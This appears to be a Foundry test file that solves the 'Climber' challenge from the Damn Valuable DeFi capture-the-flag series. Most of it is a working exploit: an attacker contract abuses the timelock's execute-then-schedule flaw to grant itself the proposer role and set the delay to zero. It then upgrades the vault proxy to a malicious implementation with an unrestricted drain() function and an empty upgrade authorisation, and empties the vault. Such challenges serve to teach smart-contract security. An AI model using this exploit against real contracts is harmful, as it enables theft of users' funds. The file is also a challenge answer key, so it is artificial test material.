// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, PROPOSER_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()),
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    )
                )
            )
        );

        timelock = ClimberTimelock(payable(vault.owner()));

        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        assertEq(timelock.delay(), TIMELOCK_DELAY);
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * EXPLOIT
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberAttacker attacker = new ClimberAttacker(
            timelock,
            vault,
            token,
            recovery
        );

        attacker.attack();
    }

    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE);
    }
}

/**
 * ATTACK CONTRACT
 */
contract ClimberAttacker {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address recovery;

    address[] targets;
    uint256[] values;
    bytes[] data;

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        DamnValuableToken _token,
        address _recovery
    ) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        // Deploy malicious implementation
        ClimberVaultV2 newImpl = new ClimberVaultV2();

        targets = new address[](4);
        values = new uint256[](4);
        data = new bytes[](4);

        // 1. Give proposer role to THIS contract
        targets[0] = address(timelock);
        values[0] = 0;
        data[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        // 2. Set delay to 0
        targets[1] = address(timelock);
        values[1] = 0;
        data[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        // 3. Upgrade vault to malicious implementation
        targets[2] = address(vault);
        values[2] = 0;
        data[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(newImpl),
            bytes("")
        );

        // 4. Schedule during execution (the core trick)
        targets[3] = address(this);
        values[3] = 0;
        data[3] = abi.encodeWithSignature("schedule()");

        // Execute — schedule() is called mid-execution, satisfying the
        // "must be scheduled" check retroactively
        timelock.execute(targets, values, data, bytes32(0));

        // Now drain the upgraded vault
        ClimberVaultV2(address(vault)).drain(address(token), recovery);
    }

    function schedule() external {
        timelock.schedule(targets, values, data, bytes32(0));
    }
}

/**
 * MALICIOUS VAULT IMPLEMENTATION
 */
contract ClimberVaultV2 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    // Mirror storage layout of ClimberVault exactly to avoid slot collisions
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function drain(address token, address receiver) external {
        IERC20(token).transfer(
            receiver,
            IERC20(token).balanceOf(address(this))
        );
    }

    function _authorizeUpgrade(address) internal override {}
}